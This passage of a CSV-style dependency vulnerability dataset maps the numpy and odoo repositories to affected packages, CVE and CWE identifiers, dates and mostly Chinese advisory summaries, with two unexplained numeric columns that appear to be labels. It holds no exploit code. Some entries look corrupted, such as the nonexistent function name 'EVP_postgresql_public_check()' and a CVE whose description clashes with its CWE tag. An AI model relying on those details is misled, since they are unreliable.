GitPython 3.1.40及之前版本存在代码问题漏洞，该漏洞源于允许攻击者通过不受信任的搜索路径执行任意代码。",2,0
numpy_numpy,GitPython,>=3.1.30,True,CVE-2023-40267,CWE-94,2023-08-11,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32之前版本存在安全漏洞，该漏洞源于没有阻止clone和clone_from中不安全的non-multi选项。",1,2
numpy_numpy,GitPython,>=3.1.30,True,CVE-2023-40590,CWE-426,2023-08-28,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在代码问题漏洞，该漏洞源于攻击者可以诱骗用户下载带有恶意git可执行文件的存储库，攻击者可以运行任何任意命令。",2,0
numpy_numpy,GitPython,>=3.1.30,True,CVE-2023-41040,CWE-22,2023-08-30,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在路径遍历漏洞，该漏洞源于为了解析一些 git 引用，GitPython 从目录中读取文件.git，在某些情况，GitPython 不会检查该文件是否位于目录之外.git，导致攻击者可以让 GitPython 从系统中读取任何文件。",3,0
numpy_numpy,urllib3,,True,,CWE-453,2020-12-02,"## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Insecure Defaults. The default SSL/TLS settings were insecure.
## Remediation
Upgrade `urllib3` to version 1.8 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/2088570a293df42b1623dd74fcff0174d0565af5)
",3,2
numpy_numpy,urllib3,,True,CVE-2020-26137,CWE-74,2020-09-29,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.25.9之前版本存在注入漏洞。该漏洞源于可以在putrequest()的第一个参数中插入CR和LF控制字符。</p>,3,2
numpy_numpy,urllib3,,True,CVE-2019-11324,CWE-295,2019-04-18,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本中存在信任管理问题漏洞。该漏洞源于网络系统或产品中缺乏有效的信任管理机制。攻击者可利用默认密码或者硬编码密码、硬编码证书等攻击受影响组件。",2,2
numpy_numpy,urllib3,,True,CVE-2019-11236,CWE-93,2019-04-15,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.24.1及之前版本版本中存在注入漏洞，该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。</p>,3,0
numpy_numpy,urllib3,,True,CVE-2018-20060,CWE-288,2018-12-11,"urllib3是一个基于Python的HTTP库，它具有线程安全连接池和文件后期支持等功能。
urllib3 1.23之前版本中存在安全漏洞，该漏洞源于程序在进行跨源重定向时，没有移除Authorization HTTP报头，导致授权报头中的凭证暴露给其他主机或以明文的形式传输。攻击者可利用该漏洞获取敏感信息。",1,2
numpy_numpy,urllib3,,True,CVE-2021-33503,CWE-400,2021-06-02,"<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 Urllib3 存在资源管理错误漏洞，该漏洞源于在鉴权模块的URL中添加@参数导致，攻击者可利用该漏洞引起资源冲突导致拒绝服务。以下产品及型号会受到影响：Urllib3 0.3, 0.3.1, 0.4, 0.4.1, 1.0, 1.0.1, 1.0.2, 1.1, 1.2, 1.2.1, 1.3, 1.4, 1.5, 1.6, 1.7, 1.7.1, 1.8, 1.8.1, 1.8.2, 1.8.3, 1.9, 1.9.1, 1.10, 1.10.1, 1.10.2, 1.10.3, 1.10.4, 1.11, 1.12, 1.13, 1.13.1, 1.14, 1.15, 1.15.1, 1.16, 1.17, 1.18, 1.18.1, 1.19, 1.19.1, 1.20, 1.21, 1.21.1, 1.22, 1.23, 1.24, 1.24.1, 1.24.2, 1.24.3, 1.25, 1.25.1, 1.25.2, 1.25.3, 1.25.4, 1.25.5, 1.25.6, 1.25.7, 1.25.8, 1.25.9, 1.25.10, 1.25.11, 1.26.0, 1.26.1, 1.26.2, 1.26.3, 1.26.4。</p>",2,2
numpy_numpy,urllib3,,True,CVE-2023-45803,CWE-200,2023-10-17,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3存在安全漏洞，该漏洞源于从303状态更改请求方法重定向到GET后不会删除请求正文。受影响的产品和版本：urllib3 2至2.0.6版本，1.26.17及之前版本。</p>,3,0
numpy_numpy,urllib3,,True,CVE-2018-25091,CWE-601,2023-10-15,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本存在安全漏洞，该漏洞源于允许攻击者获取授权标头中的凭据或以明文形式传输凭据。",3,0
numpy_numpy,urllib3,,True,CVE-2023-43804,CWE-200,,<p>urllib3 是一个支持线程安全连接池及文件上传等功能的 HTTP 客户端库。该库不对 `Cookie` HTTP 标头进行特殊处理，用户在发送请求时需自行管理。在未显式禁用重定向的情况下，用户可能会意外地通过 HTTP 重定向将信息泄露至其他源。攻击者可利用此漏洞，获取用户的 Cookie 信息，从而进行账户劫持。受影响的版本包括 1.26.16 及之前版本，以及 2.0.5 之前版本。</p>,2,1
numpy_numpy,urllib3,,True,CVE-2024-37891,CWE-669,2024-06-17,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3存在安全漏洞，该漏洞源于跨域重定向期间不会剥离代理授权请求标头。",3,0
numpy_numpy,urllib3,,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
numpy_numpy,gitpython,>=3.1.30,True,CVE-2024-22190,CWE-426,2024-01-10,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.40及之前版本存在代码问题漏洞，该漏洞源于允许攻击者通过不受信任的搜索路径执行任意代码。",2,0
numpy_numpy,gitpython,>=3.1.30,True,CVE-2023-40267,CWE-94,2023-08-11,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32之前版本存在安全漏洞，该漏洞源于没有阻止clone和clone_from中不安全的non-multi选项。",1,2
numpy_numpy,gitpython,>=3.1.30,True,CVE-2023-40590,CWE-426,2023-08-28,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在代码问题漏洞，该漏洞源于攻击者可以诱骗用户下载带有恶意git可执行文件的存储库，攻击者可以运行任何任意命令。",2,0
numpy_numpy,gitpython,>=3.1.30,True,CVE-2023-41040,CWE-22,2023-08-30,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在路径遍历漏洞，该漏洞源于为了解析一些 git 引用，GitPython 从目录中读取文件.git，在某些情况，GitPython 不会检查该文件是否位于目录之外.git，导致攻击者可以让 GitPython 从系统中读取任何文件。",3,0
numpy_numpy,twine,,True,,CWE-601,2015-01-30,"## Overview
[`twine`](https://pypi.python.org/pypi/twine) is a Collection of utilities for interacting with PyPI.

Affected versions of this package are vulnerable to Open Redirection when uploading a library to pypi.

## References
- [GitHub Issue](https://github.com/pypa/twine/issues/92)
- [GitHub PR](https://github.com/pypa/twine/pull/94)
- [GitHub Commit](https://github.com/pypa/twine/commit/29e85757559154e919c9fe0a7f5803a425628855)
",3,0
odoo_odoo,cryptography,3.4.8,True,CVE-2023-0286,CWE-843,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。存在安全漏洞，源于内存释放后重用。,2,0
odoo_odoo,cryptography,3.4.8,True,CVE-2023-23931,CWE-754,2023-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
cryptography 存在代码问题漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",3,0
odoo_odoo,cryptography,3.4.8,True,,,2023-06-03,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
odoo_odoo,cryptography,3.4.8,True,,,2023-08-02,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
odoo_odoo,cryptography,3.4.8,True,,,2023-09-22,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
odoo_odoo,cryptography,3.4.8,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
odoo_odoo,cryptography,3.4.8,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
odoo_odoo,cryptography,3.4.8,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
odoo_odoo,cryptography,3.4.8,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
odoo_odoo,cryptography,3.4.8,True,CVE-2023-49083,CWE-476,2023-11-29,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python cryptography 3.1到 41.0.6版本存在代码问题漏洞，该漏洞源于加载 PKCS7 证书时可能会导致空指针取消引用和段错误。",3,0
odoo_odoo,cryptography,3.4.8,True,CVE-2022-3996,CWE-667,2022-12-13,OpenSSL是一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库，支持多种加密算法。如果X.509证书包含格式错误的策略约束并且启用了策略处理，系统将递归地获取两次写锁，导致在某些操作系统上进程挂起，进而造成拒绝服务。,2,2
odoo_odoo,cryptography,3.4.8,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
odoo_odoo,cryptography,3.4.8,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
odoo_odoo,cryptography,3.4.8,True,CVE-2023-3817,CWE-606 CWE-834,2023-07-31,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，常用于车云通信中对传输协议的加解密。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL在部分版本中存在使用DH_check等函数检查DH参数时耗时较长的漏洞，导致拒绝服务。,3,2
odoo_odoo,cryptography,3.4.8,True,CVE-2023-3446,CWE-606 CWE-1333,2023-07-19,OpenSSL是一个开源的安全套接层和安全传输层协议的通用加密库，支持多种加密算法。在某些版本的OpenSSL中，DH_check()、DH_check_ex()或EVP_PKEY_param_check()函数在处理过大的DH密钥或参数时可能导致应用程序变得非常缓慢，造成拒绝服务。,3,2
odoo_odoo,cryptography,3.4.8,True,CVE-2023-2975,CWE-354 CWE-287,2023-07-14,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL存在授权问题漏洞，该漏洞源于密码实现存在错误，AES-SIV忽略空的关联数据条目，导致允许对多个关联的进行身份验证数据条目进行加密。",3,2
odoo_odoo,cryptography,3.4.8,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
odoo_odoo,cryptography,3.4.8,True,CVE-2023-4807,CWE-440,2023-09-08,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。 OpenSSL 1.1.1 至 1.1.1v版本、3.0.0 至 3.0.10 版本以及 3.1.0 至 3.1.2版本存在安全漏洞，该漏洞源于POLY1305 MAC（消息身份验证代码）包含一个错误，当在支持 AVX512-IFMA 指令的较新 X86_64 处理器上运行时，可能会破坏 Windows 64 平台上的应用程序内部状态。,2,0
odoo_odoo,cryptography,3.4.8,True,CVE-2024-4603,CWE-606 CWE-834,2024-05-16,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0 和 3.1 版本存在安全漏洞，该漏洞源于使用函数 EVP_PKEY_param_check()、EVP_PKEY_public_check() 检查 DSA 公钥或 DSA 参数检查的键或参数，可能会导致拒绝服务。",3,2
odoo_odoo,cryptography,42.0.8,True,CVE-2024-6119,CWE-843,2024-09-03,<p>OpenSSL 是一个广泛使用的开源加密库，主要用于实现 TLS/SSL 协议。该漏洞影响执行证书名称检查的应用程序（例如 TLS 客户端检查服务器证书）。在某些情况下，当应用程序尝试将预期名称与 X.509 证书的其他名称（otherName）字段进行比较时，可能会导致读取无效的内存地址，进而导致应用程序异常终止。需要注意的是，基本的证书链验证（例如签名、日期等）不受影响，只有在应用程序指定了预期的 DNS 名称、电子邮件地址或 IP 地址时，才可能导致拒绝服务。</p>,2,2
odoo_odoo,cryptography,42.0.8,True,CVE-2024-12797,CWE-392,2025-02-11,<p>OpenSSL 是一个用于实现传输层安全（TLS）和安全套接层（SSL）协议的开源软件库，广泛应用于保护互联网通信。漏洞位于文件 ssl/statem/statem_clnt.c 中的函数 tls_post_process_server_rpk，此函数用于在 TLS 握手过程中处理和验证服务器的原始公钥（RPK）。由于在 tls_post_process_server_rpk 函数调用中未充分处理 ssl_verify_rpk 的返回值，导致在 RPK 验证失败的情况下未能及时终止连接，使未经验证的服务器能够继续完成握手过程。攻击者可以利用此缺陷进行中间人攻击，从而截取或篡改通信内容。</p>,3,0
odoo_odoo,gevent,21.8.0,True,CVE-2023-41419,CWE-444,2023-09-20,"gevent是gevent开源的一个 Python 库。
Gevent 23.9.1之前版本存在安全漏洞。远程攻击者利用该漏洞通过特制的脚本将权限升级。",1,2
odoo_odoo,gevent,22.10.2,True,CVE-2023-41419,CWE-444,2023-09-20,"gevent是gevent开源的一个 Python 库。
Gevent 23.9.1之前版本存在安全漏洞。远程攻击者利用该漏洞通过特制的脚本将权限升级。",1,2
odoo_odoo,idna,2.10,True,CVE-2024-3651,CWE-1333,,idna 是一个用于国际化域名 (IDNA) 协议的库。此库在处理 `idna.encode` 函数时存在资源消耗漏洞。攻击者可以通过提供特制的输入，消耗大量资源，并可能导致拒绝服务 (DoS)。该漏洞是通过输入异常大的字符串触发，这种情况在正常使用中不会发生，但可能由于缺乏前置输入验证而被高级应用程序传递给库。,3,1
odoo_odoo,idna,3.6,True,CVE-2024-3651,CWE-1333,,idna 是一个用于国际化域名 (IDNA) 协议的库。此库在处理 `idna.encode` 函数时存在资源消耗漏洞。攻击者可以通过提供特制的输入，消耗大量资源，并可能导致拒绝服务 (DoS)。该漏洞是通过输入异常大的字符串触发，这种情况在正常使用中不会发生，但可能由于缺乏前置输入验证而被高级应用程序传递给库。,3,1
odoo_odoo,Jinja2,3.0.3,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
odoo_odoo,Jinja2,3.0.3,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
odoo_odoo,Jinja2,3.0.3,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
odoo_odoo,Jinja2,3.0.3,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
odoo_odoo,Jinja2,3.0.3,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
odoo_odoo,Jinja2,3.1.2,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
odoo_odoo,Jinja2,3.1.2,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
odoo_odoo,Jinja2,3.1.2,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
odoo_odoo,Jinja2,3.1.2,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
odoo_odoo,Jinja2,3.1.2,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
odoo_odoo,lxml,4.8.0,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
odoo_odoo,lxml-html-clean,,True,CVE-2024-52595,CWE-79 CWE-83 CWE-184,2024-11-19,lxml_html_clean 是 Fedora Python SIG 开发的一个开源项目，独立于 lxml.HTML.clean 功能，以提供 HTML 清理功能。它旨在帮助开发者清理和过滤 HTML 内容，防止恶意代码执行。0.4.0 之前的版本中，由于特殊标签处理不当，导致存在跨站脚本（XSS）漏洞。攻击者可能通过构造特制的输入来逃避清理过程，从而注入恶意脚本。,2,0
odoo_odoo,Pillow,9.0.1,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
odoo_odoo,Pillow,9.0.1,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
odoo_odoo,Pillow,9.0.1,True,CVE-2022-30595,CWE-787,2022-05-17,"Pillow是一款基于Python的图像处理库。
Pillow 9.1.0 版本存在安全漏洞，该漏洞源于在处理TGA文件时存在边界错误。远程攻击者利用该漏洞可以将专门设计的数据传递给应用程序，触发基于堆的缓冲区溢出，并在目标系统上执行任意代码。",2,2
odoo_odoo,Pillow,9.0.1,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
odoo_odoo,Pillow,9.0.1,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
odoo_odoo,Pillow,9.0.1,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
odoo_odoo,Pillow,9.4.0,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
odoo_odoo,Pillow,9.4.0,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
odoo_odoo,Pillow,9.4.0,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
odoo_odoo,Pillow,9.4.0,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
odoo_odoo,Pillow,10.2.0,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
odoo_odoo,PyPDF2,1.26.0,True,CVE-2022-24859,CWE-835,2022-04-18,"PyPDF2是一个免费的开源纯 python PDF 库。能够拆分、 合并、 裁剪和转换 PDF 文件的页面。
PyPDF2 存在安全漏洞，该漏洞源于在 1.27.5 之前的版本中，使用此漏洞的攻击者可以制作 PDF，如果代码尝试获取内容流，则如果 PyPDF2 导致无限循环。",3,0
odoo_odoo,PyPDF2,1.26.0,True,,CWE-400,2023-01-02,"## Overview
[PyPDF2](https://pypi.org/project/PyPDF2) is an A pure-python PDF library capable of splitting, merging, cropping, and transforming PDF files

Affected versions of this package are vulnerable to Denial of Service (DoS) due to invalid object. Exploiting this vulnerability is possible when reading the metadata.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `PyPDF2` to version 2.10.6 or higher.
## References
- [GitHub Commit](https://github.com/py-pdf/pypdf/pull/1331/commits/f88a1b022de5822261abec4e7dd9fa0e457a4ee7?show-viewed-files=true&file-filters%5B%5D=)
- [GitHub Issue](https://github.com/py-pdf/pypdf/issues/1329)
- [GitHub PR](https://github.com/py-pdf/pypdf/pull/1331)
",2,2
odoo_odoo,PyPDF2,1.26.0,True,CVE-2023-36810,CWE-407,2023-06-30,"PyPDF2是一个免费的开源纯 python PDF 库。能够拆分、 合并、 裁剪和转换 PDF 文件的页面。
pypdf 1.27.9之前版本存在安全漏洞，该漏洞源于攻击者可以制PDF导致意外的长时间运行，会阻塞进程。",3,0
odoo_odoo,PyPDF2,2.12.1,True,CVE-2023-36464,CWE-835,2023-06-27,"PyPDF2是一个免费的开源纯 python PDF 库。能够拆分、 合并、 裁剪和转换 PDF 文件的页面。
PyPDF2 2.2.0 到3.8.1版本存在安全漏洞，该漏洞源于攻击者可能会制作一个 PDF，如果执行__parse_content_stream，则会导致无限循环。",3,0
odoo_odoo,PyPDF,5.4.0,True,CVE-2025-55197,CWE-400 CWE-770,2025-08-13,pypdf 是一个由 py-pdf 开发的开源纯 Python PDF 库，主要用于拆分、合并、裁剪和转换 PDF 文件的页面。pypdf 6.0.0 之前的版本存在一个安全漏洞，该漏洞的成因是处理恶意构造的 PDF 文件时，FlateDecode 解码流过滤器会导致内存(RAM)耗尽。攻击者可以通过在 PDF 文件中嵌入恶意的交叉引用流或内容流来触发该漏洞。这种攻击在读取受影响的 PDF 文件时即可实现，尤其是在访问嵌套的 FlateDecode 过滤器时。,3,2
odoo_odoo,PyPDF,5.4.0,True,CVE-2025-62707,CWE-834,2025-10-22,pypdf 是一个纯 Python 的免费开源 PDF 库，主要用于拆分、合并、裁剪和转换 PDF 文件的页面。在版本 6.1.3 之前，pypdf 存在一个安全漏洞，攻击者可以通过制作一个特定格式的 PDF 文件，诱使受害者打开该文件，从而导致程序在解析使用 DCTDecode 过滤器的内联图像页面内容流时进入无限循环。此漏洞的根本原因在于对内联图像页面内容流的解析缺乏对 EOF 标记的正确验证，导致程序无法跳出循环。这种情况可能导致应用程序出现性能问题或拒绝服务。,3,2
odoo_odoo,PyPDF,5.4.0,True,CVE-2025-62708,CWE-409,2025-10-22,pypdf 是一个开源的纯 Python PDF 库，支持拆分、合并、裁剪和转换 PDF 文件的页面。它被广泛用于处理 PDF 文档的各类应用中。该漏洞存在于 6.1.3 之前的版本，攻击者可以通过构造一个特制的 PDF 文件，其中的页面内容流使用 LZWDecode 过滤器进行解析，这会导致内存使用不当，进而可能导致内存消耗过大。该问题的根本原因是对高度压缩数据的处理不当，未对使用 LZWDecode 流进行适当的内存分配和限制，导致数据放大效应。,3,2
odoo_odoo,python-ldap,3.4.0,True,CVE-2025-61912,CWE-116 CWE-170,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
